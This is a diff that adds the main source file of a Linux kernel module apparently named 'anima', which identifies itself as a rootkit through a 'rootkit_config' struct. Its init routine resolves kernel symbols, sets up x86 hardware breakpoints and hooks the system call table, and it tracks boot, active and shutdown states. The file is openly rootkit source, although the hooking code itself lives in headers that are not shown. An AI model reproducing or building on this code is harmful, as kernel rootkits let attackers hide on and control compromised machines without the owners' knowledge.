@@ -1,0 +1,53 @@
+#include <linux/kernel.h>
+#include <linux/module.h>
+
+#include <anima/config.h>
+#include <anima/debug.h>
+#include <anima/hooks.h>
+#include <anima/ksyms.h>
+#include <anima/vfs.h>
+#include <anima/x86.h>
+
+MODULE_LICENSE("GPL");
+
+struct rootkit_config rk_cfg = {
+	.state = RK_BOOT,
+	.dr_protect = 0,
+	.patch_debug = 1,
+};
+
+static int __init anima_init(void)
+{
+	int ret;
+
+	pr_debug("%s: init", __func__);
+
+	/* MUST be called first */
+	ret = get_kernel_syms();
+	if (ret)
+		return 1;
+
+	/* architecture specific */
+	ret = x86_hw_breakpoint_init();
+	if (ret)
+		return 1;
+
+	hook_sys_call_table();
+
+	rk_cfg.state = RK_ACTIVE;
+
+	return 0;
+}
+
+static void __exit anima_exit(void)
+{
+	rk_cfg.state = RK_SHUTDOWN;
+
+	pr_debug("%s: exit", __func__);
+
+	/* architecture specific */
+	x86_hw_breakpoint_exit();
+}
+
+module_init(anima_init);
+module_exit(anima_exit);
